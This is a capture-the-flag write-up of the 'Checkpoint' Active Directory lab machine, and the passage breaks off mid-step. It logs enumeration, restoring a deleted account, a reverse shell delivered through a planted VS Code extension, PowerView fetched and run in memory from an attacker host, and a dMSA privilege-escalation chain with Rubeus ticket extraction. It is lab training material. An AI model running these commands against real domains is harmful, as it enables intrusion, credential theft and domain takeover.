---
cover: ../.gitbook/assets/Checkpoint(AD).png
coverY: 0
---

# Checkpoint(AD)

* Initial Set of Credentials

```powershell
alex.turner:Checkpoint2024!
```

## Enumeration :

### NMAP:

```powershell
PORT      STATE SERVICE           REASON          VERSION
53/tcp    open  domain            syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-07-05 20:16:33Z)
135/tcp   open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?     syn-ack ttl 127
464/tcp   open  kpasswd5?         syn-ack ttl 127
593/tcp   open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?          syn-ack ttl 127
3268/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl? syn-ack ttl 127
5985/tcp  open  http              syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf            syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
49705/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
49714/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
```

### SMB(135,139,445):

* Since we are provided with the initial set of credentials, we try to see shares that are accessible to us

```powershell
┌──(kali㉿kali)-[~/Desktop/HTB/checkpoint]
└─$ nxc smb checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' --shares
SMB         10.129.47.49    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False) 
SMB         10.129.47.49    445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
SMB         10.129.47.49    445    DC01             [*] Enumerated shares
SMB         10.129.47.49    445    DC01             Share           Permissions     Remark
SMB         10.129.47.49    445    DC01             -----           -----------     ------
SMB         10.129.47.49    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.47.49    445    DC01             C$                              Default share
SMB         10.129.47.49    445    DC01             DevDrop         READ            VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.47.49    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.47.49    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.47.49    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.47.49    445    DC01             VMBackups
```

* We do see that we have `Read` permissions over a share named `DevDrop` so we go ahead anc check what’s present in it.

```powershell
┌──(kali㉿kali)-[~/Desktop/HTB/checkpoint]
└─$ impacket-smbclient 'checkpoint.htb/alex.turner:'@checkpoint.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# use DevDrop
# ls
drw-rw-rw-          0  Tue May 26 17:45:01 2026 .
drw-rw-rw-          0  Sat May  9 10:42:27 2026 ..
#
```

* We do see that there is nothing present in the directory so we new try to list out all the users in the Domain

```powershell
┌──(kali㉿kali)-[~/Desktop/HTB/checkpoint]
└─$ nxc smb checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' --users 
SMB         10.129.47.49    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False) 
SMB         10.129.47.49    445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
SMB         10.129.47.49    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.47.49    445    DC01             Administrator                 2026-05-09 16:16:34 0       Built-in account for administering the computer/domain 
SMB         10.129.47.49    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.47.49    445    DC01             krbtgt                        2026-05-09 08:41:01 0       Key Distribution Center Service Account 
SMB         10.129.47.49    445    DC01             alex.turner                   2026-05-09 09:00:08 0        
SMB         10.129.47.49    445    DC01             ryan.brooks                   2026-05-10 13:46:18 0        
SMB         10.129.47.49    445    DC01             svc_deploy                    2026-05-09 09:01:19 0       Deployment service account 
SMB         10.129.47.49    445    DC01             james.harper                  2026-05-09 09:02:53 0        
SMB         10.129.47.49    445    DC01             sarah.mitchell                2026-05-09 09:02:58 0        
SMB         10.129.47.49    445    DC01             emily.carter                  2026-05-09 09:03:05 0        
SMB         10.129.47.49    445    DC01             david.reynolds                2026-05-09 09:03:11 0        
SMB         10.129.47.49    445    DC01             jessica.coleman               2026-05-09 09:03:15 0        
SMB         10.129.47.49    445    DC01             lauren.flores                 2026-05-09 09:03:21 0        
SMB         10.129.47.49    445    DC01             michael.torres                2026-05-09 09:03:28 0        
SMB         10.129.47.49    445    DC01             kevin.patterson               2026-05-09 09:03:33 0        
SMB         10.129.47.49    445    DC01             brian.jenkins                 2026-05-09 09:03:37 0        
SMB         10.129.47.49    445    DC01             megan.perry                   2026-05-09 09:03:42 0        
SMB         10.129.47.49    445    DC01             max.palmer                    2026-05-26 01:25:15 0        
SMB         10.129.47.49    445    DC01             [*] Enumerated 17 local users: CHECKPOINT
```

* Now we do see a service account named `svc_deploy` so it seems like we could use `kerberoasting` here so we try it out

```powershell
┌──(kali㉿kali)-[~/Desktop/HTB/checkpoint]
└─$ nxc ldap checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' --kerberoasting hash.txt                              
LDAP        10.129.47.49    389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.47.49    389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
LDAP        10.129.47.49    389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.129.47.49    389    DC01             [*] Total of records returned 0

```

* This wasn’t successful so we moved ahead and also tried the `AS-Rep Roasting` attack as well

```powershell
┌──(kali㉿kali)-[~/Desktop/HTB/checkpoint]
└─$ nxc ldap checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' --asreproast hash.txt   
LDAP        10.129.47.49    389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.47.49    389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
LDAP        10.129.47.49    389    DC01             No entries found!

```

* This also didn’t return any positive result so we move ahead and use Bloodhound.

## Bloodhound :

### collecting the loot :

* We use `bloodyAD` to collect the loot

```powershell
┌──(.venv)─(kali㉿kali)-[~/Downloads/bloodyAD]
└─$ python3 bloodyAD.py --host 10.129.47.49 -d checkpoint.htb -u alex.turner -p Checkpoint2024! get bloodhound
[+] Connecting to LDAP server
[+] Connected to LDAP serrver
Dumping schema: 2it [00:01,  1.74it/s]
Generating lookuptable: 106it [00:02, 49.28it/s]
Dumping SDs: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 110/110 [00:25<00:00,  4.37it/s]
Dumping domains: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00,  1.46it/s]
Dumping users: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 17/17 [00:00<00:00, 70.24it/s]
Dumping computers: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00,  4.37it/s]
Dumping groups: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 58/58 [00:00<00:00, 230.76it/s]
Dumping GPOs: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 2/2 [00:00<00:00,  8.71it/s]
Dumping OUs: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 8/8 [00:00<00:00, 34.65it/s]
Dumping Containers: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 19/19 [00:00<00:00, 76.08it/s]
[+] Bloodhound data saved to 20260705T185229_Bloodhound.zip
[+] Found 0 trusts
```

* Now we analyze the Bloodhoud Data.

### Bloodhound Analysis:

* We saw that our user does not have any `Outbound Object Control`&#x20;

<figure><img src="../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

* We also check the Groups that we are part of and found that we are a part of 2 interesting groups which are `IT-STAFF` and `VPN-Users`&#x20;

<figure><img src="../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>

* We do not see anything interesting here in our bloodhound data

## Compromising `mark.devies` :

* We now use `bloodyAD` tool to manually check for any interesting thing.
* We try to get writable objects which means where we have write permssions

```powershell
┌──(kali㉿kali)-[~/Desktop/HTB/checkpoint]
└─$ bloodyad --host 10.129.48.4 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -i dc01.checkpoint.htb get writable

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

```

* We found out that we have writable permission over a deleted user named `mark.travies`
* We now use `bloodyAD` to restore this object and we are able to do this because we have the write permissions over a deleted object.

```powershell
┌──(kali㉿kali)-[~/Desktop/HTB/checkpoint]
└─$ bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -i dc01.checkpoint.htb set restore 'Mark.Davies'   
[+] Mark.Davies has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

* As we have only a single password so we try to reuse this password for the user `mark.davies` and it worked

```powershell
┌──(kali㉿kali)-[~/Desktop/HTB/checkpoint]
└─$ nxc smb checkpoint.htb -u  mark.davies -p 'Checkpoint2024!'                                                                 
SMB         10.129.48.4     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False) 
SMB         10.129.48.4     445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024!
```

* We now list shares to see the permissions

```powershell
──(kali㉿kali)-[~/Desktop/HTB/checkpoint]
└─$ nxc smb checkpoint.htb -u  mark.davies -p 'Checkpoint2024!' --shares
SMB         10.129.48.4     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False) 
SMB         10.129.48.4     445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
SMB         10.129.48.4     445    DC01             [*] Enumerated shares
SMB         10.129.48.4     445    DC01             Share           Permissions     Remark
SMB         10.129.48.4     445    DC01             -----           -----------     ------
SMB         10.129.48.4     445    DC01             ADMIN$                          Remote Admin
SMB         10.129.48.4     445    DC01             C$                              Default share
SMB         10.129.48.4     445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.48.4     445    DC01             IPC$            READ            Remote IPC
SMB         10.129.48.4     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.48.4     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.48.4     445    DC01             VMBackups        
```

## Compromising `ryan.brooks` :

* We do see a description which says `VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0` so we can utilize a `vscode extension` to get a reverse shell
* we got to know this attack path by doing a bit of research we found out the payload that works

{% embed url="https://github.com/securezeron/VsCodeExtLure" %}

* Now we go ahead and use it
* We modifed the `config.JSON` as we have to change it to our IP for reverse shell and the port specified was `9098`
* Then we ran the below command

```powershell
┌──(kali㉿kali)-[~/Desktop/HTB/checkpoint/VsCodeExtLure]
└─$ ./VsCodeLure.sh            

     _-----_     ╭──────────────────────────╮
    |       |    │   Welcome to the Visual  │
    |--(o)--|    │   Studio Code Extension  │
   `---------´   │        generator!        │
    ( _´U`_ )    ╰──────────────────────────╯
    /___A___\   /
     |  ~  |     
   __'.___.'__   
 ´   `  |° ´ Y ` 

Error code --extensionType=js --extensionDisplayName=ZeronCySec --extensionId=Zeron-CySec --extensionDescription=Proof Of Concept For Popping Shells With Extensions --pkgManager=npm --gitInit=False 

User force closed the prompt with 0 null
Loaded config: {'extensionDisplayName': 'ZeronCySec', 'extensionId': 'Zeron-CySec', 'extensionDescription': 'Proof Of Concept For Popping Shells With Extensions', 'IP': '10.10.15.20', 'Port': 9098}
stage2.py completed successfully.

```

* Now we go ahead and put the generated `vsix` extension file in the `DevDrop` share and on the other hand we keep the listener started on port 9098

<figure><img src="../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

```powershell
┌──(kali㉿kali)-[~/…/HTB/checkpoint/VsCodeExtLure/Zeron-CySec]
└─$ impacket-smbclient 'checkpoint.htb/mark.davies:'@checkpoint.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# ls
[-] No share selected
# shares
ADMIN$
C$
DevDrop
IPC$
NETLOGON
SYSVOL
VMBackups
# use DevDrop
# put Zeron-CySec-0.0.1.vsix
# 

```

* On the other hand, we got a callback and were successfully able to get a shell as `ryan.brooks`&#x20;

<figure><img src="../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

* While enumerating on the shell we found the user flag on the Desktop of `ryan.brooks`&#x20;

<figure><img src="../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

*   We now check this user’s permissions on `bloodhound`

    * We see that the user `ryan.brooks` has generic write over `svc_deploy` user so we go ahead and exploit this to take control of `svc_deploy` account

    <figure><img src="../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>
* For this we will utilise the rever shell as `ryan.brooks` user
* first we load `powerview` in memory in the shell

```powershell
PS C:\temp> iex (New-Object System.NET.WebClient).DownloadString('http://10.10.15.20:8081/PowerView.ps1')
iex (New-Object System.NET.WebClient).DownloadString('http://10.10.15.20:8081/powerview.ps1')

```

* Now we use the `Set-DomainObject` powerview command

```powershell
PS C:\temp> Set-DomainObject -Identity svc_deploy -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
Set-DomainObject -Identity svc_deploy -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}

```

* Now we get the hash and try to crack it offline using `hashcat`

```powershell
┌──(kali㉿kali)-[~/Desktop/HTB/checkpoint]
└─$ nxc ldap checkpoint.htb -u  mark.davies -p 'Checkpoint2024!' --kerberoasting hash.txt
LDAP        10.129.48.4     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.48.4     389    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
LDAP        10.129.48.4     389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.129.48.4     389    DC01             [*] Total of records returned 1
LDAP        10.129.48.4     389    DC01             [*] sAMAccountName: svc_deploy, memberOf: ['CN=BackupAccess,OU=ServiceAccounts,DC=checkpoint,DC=htb', 'CN=Remote Management Users,CN=Builtin,DC=checkpoint,DC=htb'], pwdLastSet: 2026-05-09 05:01:19.573610, lastLogon: <never>
LDAP        10.129.48.4     389    DC01             $krb5tgs$18$svc_deploy$CHECKPOINT.HTB$*checkpoint.htb\svc_deploy*$9e7ab2de564345ff700e295a$5a076f7532372ae1220e9f585ae824d9b94b77c24e4a5c314b66207772f2faadd5c42d2a63b950d9473d60a88ad2e82c87577bc0dab0f2fa3e318749c526fc5158b54dddecbff3c537c4c315cd450412f0cd4764c6f2b35ed463e5b8bc52f96e242db31535764a813f2b2e4b35941da4a3a2942ac2063587adae265162c64a88a3483bc2316b262fcd0995c1e72a77c56389fd3837c71c0a378cd4fcbde39f1913d534618d13713e67c48ce6bf9701a94f38a70d4a2c535396b75275c9be786b2c979d6795f27c982e02dfaa9f10460ec3acf2853f7ce43542de1a41a07b8394d69226c34a176c7c7e855ca20de16f4c9326295403afc86b61e332d831000915a91638eb4a79f5fbddadd2b0755e7069cacf3ad21cd16dba9b72660c848defd602fbc34a101d40819ddd19e1c97590e183235868649f4cbcd214e0b54843c56eaa5a7d00a12ce7fd001fcbc8277798f5bd4af531fb53d4165deade50360112fe685ed58e89e0a71a9cb2829c0ca21d9acd822845f428fca5179b8b028058744db41ea9acb2a7662cc49aeb53cde719179d66e2da06b9f453a93af6f1dd8acb1b8de53a945a633a27f8ab5bd6adef7e90aacd6af3ac03828ac3ef303ca7674ecb5d5ba51bbd328952bfb3aab9759950d17498695483d42d2c4657543c320fc6ad2118345c0998e54401c5e39d73af9eb5b159e1e856feb41b92a8b15840579924c7a6a470308899b32100f353a8c0efa5d4f7b5450301b6020402fe6110d2a905084f14cbc2ce784c345a7a47125792cf6d6ed766a07aa1cb7e88dcbb6737453491e37a69c4cfb32a895e0d1927549a63956b6b8557e131e93fc4409704f19bd377cea021c0a92a550ab2321d5efdc8d54e4e669ac883bad32262a5693d1835b71be99551a9d1d5508c85cb4b052baa2aa0f59c24274cb9de393bfebc9319c32acc61bf6cb6c723a22adb84d888724fff25c444b30e43a122385049d6fda4a3d99e7c2dcafbe7a2a94abbacda5c6adce71a0b3476c588e7458fa368e6b12b916b6ff6f297f1551bb16e4a777e64998f14b1c8da80691bbf303c805a1ce934b78fbb1e4c3b8d65670d72924872db1401999023e06ed7bc4fb0df7bb06da550e990b24e5c8e59ecd8d61d7c866e06c48ce9b1638983f296e45c38db72dc6f4875765093cd04c95448caa6b04427e5c7ad3b591cbabc80de8b5c7cc9c7fafdb61c5714d916aed26447aa8b217de03287723d8ba91304e68eb48c6f672efbb4834a943a9ae78d72c86707153f399d1ee2a7e35eb0a7fc09b75efd01d5ca7d022bf36123bf3bbf1ce1ad9967c94e1463cfc688372cf4162f1337d2c260c1956aeacd5d5fe8dd3c1c9290b7e05187c7208cecb7bc868a60711ad399c2305c6e743eb880c14725a6fdccc338eb4e907b00ee99a771ba3ad9244f24cdabc8421cb8686c167a7fe2fc19e456d96d807273f41d2d7b9ba3144de5e24c0f331adeb53435eb644473017fe1ece1baffea47b30a561ae0e04d1b756c54b55b63443762f64a35d8be527819897d1f3adf65
```

* Unfortunately, we couldn’t crack this hash so we think of other ways to move in the domain.

## Compromising `Administrator` :

* After a while we figured out that the `BetterSuccessor` attack is the way forward as `ryan.brooks` user had `Genericwrite` permissions over `svc_deploy` and `GMSAHolders` group.

{% embed url="https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch" %}

```powershell
PS C:\Users\Public> iwr http://10.10.15.20:8081/SharpSuccessor.exe -Outfile SharpSuccessor.exe
iwr http://10.10.15.20:8081/SharpSuccessor.exe -Outfile SharpSuccessor.exe
PS C:\Users\Public> iwr http://10.10.15.20:8081/Rubeus.exe -Outfile Rubeus.exe
iwr http://10.10.15.20:8081/Rubeus.exe -Outfile Rubeus.exe
PS C:\Users\Public> iex (New-Object System.NET.WebClient).DownloadString('http://10.10.15.20:8081/powerview.ps1')

```

* Now we use `sharpsuccessor.exe` to create a fake account named `attacker_dMSA` to impersonate a high privilege user named `svc_deploy` .

```powershell
PS C:\Users\Public> ./SharpSuccessor.exe add /impersonate:svc_deploy /path:"OU=DMSAHOLDER,DC=CHECKPOINT,DC=HTB" /account:ryan.brooks /name:attacker_dMSA
./SharpSuccessor.exe add /impersonate:svc_deploy /path:"OU=DMSAHOLDER,DC=CHECKPOINT,DC=HTB" /account:ryan.brooks /name:attacker_dMSA
   _____ _                      _____                                        
  / ____| |                    / ____|                                       
 | (___ | |__   __ _ _ __ _ __| (___  _   _  ___ ___ ___  ___ ___  ___  _ __ 
  \___ \| '_ \ / _` | '__| '_ \\___ \| | | |/ __/ __/ _ \/ __/ __|/ _ \| '__|
  ____) | | | | (_| | |  | |_) |___) | |_| | (_| (_|  __/\__ \__ \ (_) | |   
 |_____/|_| |_|\__,_|_|  | .__/_____/ \__,_|\___\___\___||___/___/\___/|_|   
                         | |                                                 
                         |_|                                                 
@_logangoins

[+] Adding dnshostname attacker_dMSA.checkpoint.htb
[+] Adding samaccountname attacker_dMSA$
[+] svc_deploy's DN identified
[+] Attempting to write msDS-ManagedAccountPrecededByLink
[+] Wrote attribute successfully
[+] Attempting to write msDS-DelegatedMSAState attribute
[+] Attempting to set access rights on the dMSA object
[+] Attempting to write msDS-SupportedEncryptionTypes attribute
[+] Attempting to write userAccountControl attribute
[+] Created dMSA object 'CN=attacker_dMSA' in 'OU=DMSAHOLDER,DC=CHECKPOINT,DC=HTB'
[+] Successfully weaponized dMSA object
[+] Found target account, attempting to write attributes
[+] CN=attacker_dMSA,OU=DMSAHolder,DC=checkpoint,DC=htb written to svc_deploy object
[+] msDS-SupersededServiceAccountState set to 2
[+] Wrote to target account successfully

```

<figure><img src="../.gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>

* We have `GenericWrite` over the user `svc_deploy` so we use it to point to our fake GMSA account.
* We use powerview to set the `msDS-SupersededManagedAccountLink` and `msDS-SupersededServiceAccountState` for the `svc_deploy` user.

```powershell
PS C:\Users\Public> Set-DomainObject -Identity svc_deploy -Set @{'msDS-SupersededManagedAccountLink'='CN=attacker_dMSA,OU=DMSAHolder,DC=checkpoint,DC=htb'}

```

```powershell
PS C:\Users\Public>  iex (New-Object System.NET.WebClient).DownloadString('http://10.10.15.20:8081/PowerView.ps1')
 iex (New-Object System.NET.WebClient).DownloadString('http://10.10.15.20:8081/PowerView.ps1')
PS C:\Users\Public> Set-DomainObject -Identity svc_deploy -Set @{'msDS-SupersededServiceAccountState'=2} -verbose
Set-DomainObject -Identity svc_deploy -Set @{'msDS-SupersededServiceAccountState'=2} -verbose
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.CHECKPOINT.HTB/DC=CHECKPOINT,DC=HTB
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: 
(&(|(|(samAccountName=svc_deploy)(name=svc_deploy)(displayname=svc_deploy))))
VERBOSE: [Set-DomainObject] Setting 'msDS-SupersededServiceAccountState' to '2' for object 'svc_deploy'

```

* Now on the `ryan.brooks` shell we use `Rubeus.exe` with `tgtdeleg`

```powershell
PS C:\Users\Public> ./Rubeus.exe tgtdeleg /nowrap
./Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: 29/ZhPgCKO3tyj4aDMCvLx6QjymaclPurN68J42T6Oc=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRusXTqqPWaAnHRxluw+W5f5RUwZtHjzFylOPUSOCelvqza8D3I6elsdpStGnZl8PwSKgX5m3F0iYLh8+a05AjLXBc6RW57+gGn3KPGS99WswE0YffHjoF7HmC8N7h5FumF4s9APGgEuLEGmoWisJw1LMtldHYyG/LnMD+7tmxDIu0CJwEleToIMam2CbAcKC/JDr02rWtAB/a8Oe8Xp4YVbDX6DUZEBkB0qjXF+5JzfDKExwzB8ge2nP0XrBbKtC52aZ+61+t+jeMp4Z0t1+69On0duRZXRc1sTckoCY85vM8sUCFEC7cuP7b0u8z8MtWVUjAqMr+XH3B3mZtFylAEpjz3GEHeMo9mOKwfwAEO7OqU+4/0d9PbXdJpqdl6yvFyib5z9E94eeacTWmc0s2XivvBt60fUMPOQaZLOjUeDIjwlBUzeGbGfB8y0gLh3s7UlEfsboJNz0nFpcBhS2NapS8SVo9FSUC2CKkAN99bA/NfQUuO6HpS8u4q983oRWdP8lG8RjiKDUD4B6m8HIZHDtXhRHHQJ0qg/jSQtoopn5nM5zqfIE3AZoR+a9qfX7abr/DQH13lQ/fxnv9ZI5J5X26zkHwVsTGUdMmD94HpjU0SQy9Oqj5GbK6y9A8evrET4dpwmhJ2Bh5waj5bcEjFi5jwznwF7kK2UC92OT3cg6R/NzSn0JWIYDY3H+l2VEbPT/JSiQ5FoJ79xr1dlkuA6svGiC/QbMilR0OO1vRUpACQmVTPPR8WGpKWd/XKRlPnL7MvFrHgRB4M6MQVA+6l0p5cFRvRflETS4qazLRsRIeziega82s2GhzDwR3OgRaIYgq3jYl6nk6dAAAbPKpDAnSTBTJ342d8rwrem+Euz7LJ27Igps33hEfuwb+zZ7LQ+qGpUQ7WsoREwP6bWH2eWtDQrQwuqZpp0+ZyJ1q9sbgGPSclYq0Si1MghATiCOVKBkDMmglL2WLnfwrctxWjcqWE9EwUn7IWk7Z1JItiRMuFhFtyt+IN1q1y5juOScRlUYVtFk/7zj7nVNZdMrlnD4TrJ3r/aEd1Kig0JvHYv4PEnRIbDyf9uvgwzAMLxf3mshUNvCHXVNvmuvMk1vb93DjeuOmPwoHgdrJRfXdBcIfRpBsE32Yjv4OoDXK66jBsIDEJe+u0iCQHseL2kLKeLCdaMQSBYHOw/8VNqmaTi044KLkzyE+VSXFqXPix0EWgUBfRCnqjjQUyOW+3z9K8v7baPbM2dwCWCKtYSxeoTY2rTnx2IovPAeipTn75hm+Ma8TkLygqZ02B3H3pxSYgr3KPxo5yW9Uo0mgXx+2BxhoDWRu1hEsS7uq2vqaZ5CA/0UJJJ4ODOflmkthnwfO3szRALN8JBSEiuUYOnA+OWBcxljmL3WMdYBOB5cDzLRv724/MpO7eIcmIFsfEEWvD3HagnycLaDPUlcnG5+65uzztXgIgbJT5OBL5E3dycHc59mRDtRCEbHBOyjsbnwKdJhk5kCooeReVzWapL8KJo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgTosd/J9pfa3yrzaPk90BL/mUftKLHIZ9rgfqsijmp8WhEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDcxNDAxMDYxMlqmERgPMjAyNjA3MTQxMTA2MTJapxEYDzIwMjYwNzIxMDEwNjEyWqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=

```

* Now we use it and take this to kali as `ryan2.kirbi` and convert it to `ccache` using `impacket-ticketconverter`

```powershell
┌──(kali㉿kali)-[~/Desktop/HTB/checkpoint]
